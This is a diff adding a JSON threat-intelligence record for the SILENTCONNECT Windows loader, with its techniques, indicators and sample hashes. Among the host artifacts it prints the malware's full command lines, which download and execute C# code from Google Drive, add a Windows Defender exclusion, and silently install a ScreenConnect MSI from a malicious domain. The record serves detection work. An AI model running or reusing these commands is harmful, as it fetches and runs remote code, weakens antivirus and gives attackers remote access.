@@ -1,0 +1,247 @@
+{
+  "malware_family": "SILENTCONNECT",
+  "threat_actor": "",
+  "platforms": [
+    "windows"
+  ],
+  "summary": "SILENTCONNECT is a multi-stage loader that begins with a VBScript lure, which downloads and executes a C# payload from Google Drive using PowerShell. The loader uses PEB masquerading, UAC bypass, and adds a Windows Defender exclusion before its final action of silently installing the ScreenConnect RMM tool for remote access.",
+  "mitre_techniques": [
+    "T1059.001",
+    "T1562.001",
+    "T1548.002",
+    "T1219",
+    "T1105",
+    "T1027"
+  ],
+  "host_artifacts": [
+    {
+      "kind": "file_path",
+      "value": "C:\\Windows\\Temp\\FileR.txt",
+      "context": "Path for downloaded C# source code from Google Drive.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "E-INVITE.vbs",
+      "context": "Initial VBScript dropper filename.",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "c:\\windows\\winhlp32.exe",
+      "context": "FullDllName used for PEB masquerading.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "winhlp32.exe",
+      "context": "BaseDllName used for PEB masquerading, found in binary.",
+      "specificity": "high",
+      "evidence": "strings_listing",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -ExecutionPolicy Bypass -command \"New-Item -ItemType Directory -Path 'C:\\Windows\\Temp' -Force | Out-Null; curl.exe -L 'https://drive.google.com/uc?id=1ohZxxT-h7xWVgclB1kvpvwkF0AGWoUtq&export=download' -o 'C:\\Windows\\Temp\\FileR.txt';Start-Sleep -Seconds 8;$source = [System.IO.File]::ReadAllText('C:\\Windows\\Temp\\FileR.txt');Start-Sleep -Seconds 1;Add-Type -ReferencedAssemblies 'Microsoft.CSharp' -TypeDefinition $source -Language CSharp; [HelloWorld]::SayHello()\"",
+      "context": "VBScript deobfuscated command to download and run C# stage.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "Add-MpPreference -ExclusionExtension .exe -Force",
+      "context": "Command to add Windows Defender exclusion for .exe files.",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "New-Item -ItemType Directory -Path 'C:\\Temp' -Force | Out-Null; curl.exe -L 'https://bumptobabeco.top/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest' -o 'C:\\Temp\\ScreenConnect.ClientSetup.msi'; Start-Process msiexec.exe '/i C:\\Temp\\ScreenConnect.ClientSetup.msi'",
+      "context": "Command to download and install ScreenConnect MSI.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "[HelloWorld]::SayHello()",
+      "context": "C# method invocation to start the loader.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "wen!rotartsinimdA:noitavelE",
+      "context": "Reversed COM moniker string for UAC bypass.",
+      "specificity": "high",
+      "evidence": "strings_listing",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "MasqueradePEB",
+      "context": "Internal string found in the loader binary.",
+      "specificity": "high",
+      "evidence": "strings_listing",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "typelib_guid",
+      "value": "3E5FC7F9-9A51-4367-9063-A120244FBEC7",
+      "context": "Unique GUID found in the loader binary.",
+      "specificity": "high",
+      "evidence": "strings_listing",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "PebFucker",
+      "context": "Internal string found in the loader binary.",
+      "specificity": "high",
+      "evidence": "strings_listing",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "tcennoCneercS",
+      "context": "Reversed 'ScreenConnect' string found in the loader binary.",
+      "specificity": "high",
+      "evidence": "strings_listing",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "hex_pattern",
+      "value": "{ 53 48 31 DB 48 31 C0 65 48 8B 1C 25 60 00 00 00 }",
+      "context": "Shellcode to retrieve the PEB address.",
+      "specificity": "high",
+      "evidence": "strings_listing",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    }
+  ],
+  "network_artifacts": [
+    {
+      "kind": "url",
+      "value": "https://drive.google.com/uc?id=1ohZxxT-h7xWVgclB1kvpvwkF0AGWoUtq&export=download",
+      "context": "URL to download C# source payload (FileR.txt).",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://bumptobabeco.top/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest",
+      "context": "URL to download ScreenConnect MSI installer.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "bumptobabeco.top",
+      "context": "ScreenConnect C2 Server.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "86.38.225.59",
+      "context": "ScreenConnect C2 Server IP.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "instance-lh1907-relay.screenconnect.com",
+      "context": "ScreenConnect C2 Server for a different campaign.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/download_invitee.php",
+      "context": "Recurring URI path used for payload delivery across compromised sites.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": ""
+    },
+    {
+      "kind": "other",
+      "value": "8041",
+      "context": "ScreenConnect C2 beacon TCP port.",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "ScreenConnect"
+    },
+    {
+      "kind": "url",
+      "value": "imansport.ir/download_invitee.php",
+      "context": "Redirect URL from phishing email link.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": ""
+    }
+  ],
+  "samples": [
+    {
+      "sha256": "8bab731ac2f7d015b81c2002f518fff06ea751a34a711907e80e98cf70b557db",
+      "description": "SILENTCONNECT loader"
+    },
+    {
+      "sha256": "281226ca0203537fa422b17102047dac314bc0c466ec71b2e6350d75f968f2a3",
+      "description": "VBScript dropper (E-INVITE.vbs)"
+    },
+    {
+      "sha256": "81956d08c8efd2f0e29fd3962bcf9559c73b1591081f14a6297e226958c30d03",
+      "description": "C# source payload (FileR.txt)"
+    },
+    {
+      "sha256": "c3d4361939d3f6cf2fe798fef68d4713141c48dce7dd29d3838a5d0c66aa29c7",
+      "description": "ScreenConnect.ClientSetup.msi installer"
+    }
+  ],
+  "file_types": [
+    "script",
+    "pe",
+    "dotnet"
+  ]
+}
